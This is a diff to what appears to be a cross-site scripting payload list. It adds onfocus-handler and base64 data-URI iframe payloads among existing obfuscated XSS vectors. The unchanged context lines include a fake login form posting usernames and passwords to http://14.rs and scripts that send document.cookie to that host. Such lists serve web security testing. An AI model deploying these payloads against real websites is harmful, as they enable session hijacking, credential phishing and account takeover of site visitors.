@@ -68,6 +68,10 @@ javascript:%ef%bb%bfalert(XSS)
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>
 "`'><script>\xE2\x80\x87javascript:alert(1)</script>
+``/onfocus=alert(document.domain)
+`/onfocus=alert(document.domain)
+/onfocus=alert(document.domain)
+onfocus=alert(document.domain)
 <img/src=x onError="`${x}`;alert(`Hello`);">
 "`'><script>\xE2\x80\x87javascript:alert(1)</script>
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
@@ -115,6 +119,9 @@ lert&#x000000028;origin&#x000029;>
 <h3>Please login to proceed</h3> <form action=http://14.rs>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
 <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
 "><iframe src="https://14.rs" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
+"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>
+><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>
 <IFRAME SRC="javascript:alert(document.cookie);"></iframe>
 <script>document.location='http://14.rs?c='+document.cookie</script>
 <script>new Image().src="http://14.rs/cookie.php?c="+document.cookie</script>
